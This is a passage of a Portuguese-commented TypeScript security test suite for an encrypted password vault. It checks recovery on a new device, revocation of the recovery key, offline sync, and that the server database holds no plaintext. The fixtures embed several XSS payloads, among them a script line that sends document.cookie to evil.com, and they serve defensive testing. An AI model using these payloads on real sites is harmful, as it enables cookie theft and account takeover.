      'O compromisso público não pode liberar o pacote de recuperação'
    );

    // 4. RECUPERAÇÃO REAL EM DISPOSITIVO TOTALMENTE NOVO (Sem dispositivo original e sem Senha Mestra antiga!)
    const bundleRes = await fetch(
      `${baseUrl}/api/v1/sync/vault/recovery/bundle`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          vaultId: container.vaultId,
          recoveryAuthToken: CryptoEngine.deriveRecoveryAuthToken(
            kitV2.recoveryKey!,
            container.vaultId,
            2
          ),
          deviceName: 'Novo Notebook Pós-Desastre',
          platform: 'desktop-web',
        }),
      }
    );
    assert.equal(bundleRes.status, 200);
    const bundleData = await bundleRes.json();

    // Tenta descriptografar localmente com uma Recovery Key errada -> deve falhar criptograficamente
    await assert.rejects(
      async () => {
        await CryptoEngine.recoverVaultOnNewDeviceWithEmergencyKit({
          recoveryKey: CryptoEngine.generateRecoveryKey256(),
          recoveryMetadata: bundleData.recoveryMetadata,
          encryptedRecords: bundleData.records,
          newMasterPassword: 'NovaSenhaMestraPosRecuperacao!2026',
        });
      },
      /Falha na recuperação criptográfica/
    );

    // Desencapsula a DEK no novo dispositivo usando a Recovery Key correta do Kit v2 e define Nova Senha Mestra
    const recovered =
      await CryptoEngine.recoverVaultOnNewDeviceWithEmergencyKit({
        recoveryKey: kitV2.recoveryKey,
        recoveryMetadata: bundleData.recoveryMetadata,
        encryptedRecords: bundleData.records,
        newMasterPassword: 'NovaSenhaMestraPosRecuperacao!2026',
        targetKdfParams: TEST_KDF_PARAMS,
      });

    assert.equal(
      recovered.recoveredPayload.credentials.length,
      sample.credentials.length,
      '100% das credenciais devem ser recuperadas no novo dispositivo sem o dispositivo original'
    );
    assert.equal(
      recovered.recoveredPayload.notes.length,
      sample.notes.length,
      '100% das notas privadas devem ser recuperadas no novo dispositivo'
    );
    assert.equal(
      recovered.recoveredPayload.credentials[0].password,
      sample.credentials[0].password
    );

    // 5. POLÍTICA DE REVOGAÇÃO DA CHAVE DE RECUPERAÇÃO:
    const revokeRecRes = await fetch(
      `${baseUrl}/api/v1/sync/vault/recovery/revoke`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${bundleData.sessionToken}`,
          'X-Device-Id': bundleData.device.deviceId,
        },
        body: JSON.stringify({ vaultId: container.vaultId }),
      }
    );
    assert.equal(revokeRecRes.status, 200);

    // Após revogação, nem mesmo o Kit v2 pode baixar o pacote de recuperação -> 403 Forbidden
    const afterRevokeBundleRes = await fetch(
      `${baseUrl}/api/v1/sync/vault/recovery/bundle`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          vaultId: container.vaultId,
          recoveryAuthToken: CryptoEngine.deriveRecoveryAuthToken(
            kitV2.recoveryKey!,
            container.vaultId,
            2
          ),
        }),
      }
    );
    assert.equal(
      afterRevokeBundleRes.status,
      403,
      'Chave de recuperação revogada deve negar emissão de bundle com 403 Forbidden'
    );

    CryptoEngine.zeroize(recovered.sessionDek);
  });
});

// ============================================================================
// 4. PROVA CRIPTOGRÁFICA ZERO-KNOWLEDGE, XSS PERSISTENTE E INDISPONIBILIDADE
//    PROLONGADA DO SERVIDOR (§4, §5-G, §5-H, §7)
// ============================================================================
test('Fase 5A - 04 (§4, §5-G, §5-H, §7): Prova criptográfica Zero-Knowledge no dump SQL, resistência a XSS persistente e funcionamento contínuo durante indisponibilidade prolongada do backend + reabertura do app', async () => {
  await withLiveSecurityServer(async (baseUrl) => {
    const userUid = CryptoEngine.randomId('usr-zk-xss-5a');
    const masterPassword = 'UltraSecretMasterPassword!99';
    const sample = createSampleSpringFieldPayload();

    // Injeta vetores de XSS persistente em credencial e nota para testar armazenamento cifrado e integridade
    const xssCred: CredentialItem = {
      id: 'cred-xss-vector',
      serviceName: '<script>window.__pwned=1;</script><img src=x onerror=alert(1)>',
      url: 'javascript:alert(document.cookie)',
      username: '"><svg/onload=alert(1)>',
      email: 'xss@springfield.local',
      password: 'SecretPass<script>alert("leak")</script>99!',
      category: 'outros',
      tags: ['<iframe src="javascript:alert(1)">'],
      notes: 'Nota com payload XSS: {{constructor.constructor("alert(1)")()}}',
      favorite: true,
      revision: 1,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      deletedAt: null,
    };
    const xssNote: SecretNote = {
      id: 'note-xss-vector',
      title: '<script>fetch("https://evil.com?c="+document.cookie)</script>',
      content: 'SegredoNuclearUltraConfidencial_99887766',
      category: 'Segredos',
      favorite: true,
      colorTint: 'pink',
      revision: 1,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      deletedAt: null,
    };

    sample.credentials.push(xssCred);
    sample.notes.push(xssNote);

    const { container, sessionDek } = await CryptoEngine.sealContainerV2(
      masterPassword,
      sample,
      TEST_KDF_PARAMS
    );

    const mobileSync = new SyncAdapter();
    const regMobile = await mobileSync.registerDeviceOnBackend(baseUrl, {
      userUid,
      email: `${userUid}@donutvault.local`,
      deviceName: 'Celular DonutPhone (<script>alert(1)</script>)',
      platform: 'mobile-web',
      authMethod: 'webauthn-passkey',
    });
    const mobileAuth = {
      userUid,
      deviceId: regMobile.device.deviceId,
      sessionToken: regMobile.sessionToken,
    };

    await mobileSync.registerVaultOnBackend(baseUrl, mobileAuth, {
      vaultId: container.vaultId,
      activeKeyEpoch: container.keyEpoch,
      kdfParams: container.kdfParams,
      saltHex: container.saltHex,
      wrappedDekHex: container.wrappedDekHex,
      dekNonceHex: container.dekNonceHex,
    });

    for (const rec of container.records) {
      mobileSync.enqueueRecordOperation(rec, 0);
    }

    // CENÁRIO G & H (§5): Simula indisponibilidade prolongada do backend e fechamento/reabertura do aplicativo no celular!
    setSimulateNextDbFailure(true);
    await assert.rejects(async () => {
      await mobileSync.flushOfflineQueueToBackend(
        baseUrl,
        mobileAuth,
        container.vaultId,
        sessionDek,
        container.keyEpoch
      );
    });

    // Persiste a fila offline e o cofre criptografado no IndexedDB antes de "fechar o aplicativo"
    const savedQueueBeforeClose = mobileSync.exportPersistentQueueState(0);
    await StorageService.savePersistentSyncState(savedQueueBeforeClose);
    const { envelope: localV1Envelope, sessionDek: localV1Dek } =
      await CryptoEngine.sealNewVault(masterPassword, sample, TEST_KDF_PARAMS);
    await StorageService.saveEnvelope(localV1Envelope, {
      allowRollbackOrReplace: true,
    });
    CryptoEngine.zeroize(localV1Dek);

    // Mesmo com o servidor indisponível, o usuário reabre o app offline e acessa seus dados locais!
    const loadedOfflineEnvelope = await StorageService.loadEnvelope();
    assert.ok(loadedOfflineEnvelope);
    const { payload: unlockedOfflinePayload, sessionDek: reopenedDek } =
      await CryptoEngine.unsealVault(loadedOfflineEnvelope, masterPassword);
    assert.equal(
      unlockedOfflinePayload.credentials.length,
      sample.credentials.length,
      'O usuário deve conseguir acessar todas as senhas localmente mesmo com o servidor indisponível (Cenário G)'
    );
    CryptoEngine.zeroize(reopenedDek);

    // Simula reabertura do aplicativo no celular (nova instância de SyncAdapter restaurando fila do IndexedDB — Cenário H)
    const reopenedMobileSync = new SyncAdapter();
    const rawQueueFromIdb = await StorageService.loadPersistentSyncState();
    assert.ok(rawQueueFromIdb);
    reopenedMobileSync.restorePersistentQueueState(rawQueueFromIdb);
    assert.equal(
      reopenedMobileSync.getPendingQueue().length,
      container.records.length,
      'Fila offline deve sobreviver ao fechamento e reabertura do aplicativo no celular (Cenário H)'
    );

    // Servidor volta a ficar disponível -> sincroniza automaticamente
    const flushAfterReopen =
      await reopenedMobileSync.flushOfflineQueueToBackend(
        baseUrl,
        mobileAuth,
        container.vaultId,
        sessionDek,
        container.keyEpoch
      );
    assert.equal(flushAfterReopen.appliedCount, container.records.length);
    assert.equal(reopenedMobileSync.getPendingQueue().length, 0);

    // PROVA CRIPTOGRÁFICA ZERO-KNOWLEDGE (§4):
    // Inspeciona o estado bruto do PostgreSQL (vaults, encrypted_records, auth_audit_logs)
    // e comprova que o servidor NÃO consegue recuperar nenhum dado sensível nem possui DEK/KEK/Senha Mestra!
    const rawDbState = await inspectRawDatabaseStateForTest(container.vaultId);
    const serializedDbDump = JSON.stringify(rawDbState);
    const dekHex = Buffer.from(sessionDek).toString('hex');

    assert.ok(
      !serializedDbDump.includes(masterPassword),
      'Senha Mestra jamais deve existir no banco ou nos logs'
    );
    assert.ok(
      !serializedDbDump.includes(dekHex),
      'DEK em hexadecimal jamais deve existir em texto puro no banco ou nos logs'
    );
    assert.ok(
      !serializedDbDump.includes('SegredoNuclearUltraConfidencial_99887766'),
      'Conteúdo de nota secreta jamais deve existir em texto puro no PostgreSQL'
    );
    assert.ok(
      !serializedDbDump.includes('SecretPass<script>'),
      'Senhas e payloads XSS das credenciais permanecem 100% cifrados como hex AES-256-GCM no PostgreSQL'
    );
    assert.ok(
      !serializedDbDump.includes(mobileAuth.sessionToken),
      'Token de sessão bruto jamais deve aparecer nos logs de auditoria ou tabelas (apenas hash SHA-256)'
    );

    // Verifica que mesmo possuindo o dump completo de `vaults` e `encrypted_records` do PostgreSQL,
    // é impossível descriptografar qualquer registro sem a DEK derivada localmente da Senha Mestra:
    const wrongDek = CryptoEngine.getRandomBytes(32);
    await assert.rejects(
      async () => {
        const sampleRecord = rawDbState.encryptedRecords[0];
        await CryptoEngine.unsealRecordV2(
          wrongDek,
          {
            recordId: sampleRecord.recordId,
            vaultId: sampleRecord.vaultId,
            recordType: sampleRecord.recordType as 'credential' | 'note',
            formatVersion: 2,
            revision: sampleRecord.revision,
            keyEpoch: sampleRecord.keyEpoch,
            deleted: sampleRecord.deleted,
            updatedAt: sampleRecord.updatedAt.toISOString(),
            nonceHex: sampleRecord.nonceHex,
            ciphertextHex: sampleRecord.ciphertextHex,
            aadHashSha256Hex: sampleRecord.aadHashSha256Hex,
          },
          container.vaultId
        );
      },
      /Falha de autenticação AES-256-GCM/
    );

    CryptoEngine.zeroize(wrongDek);
    CryptoEngine.zeroize(sessionDek);
  });
});
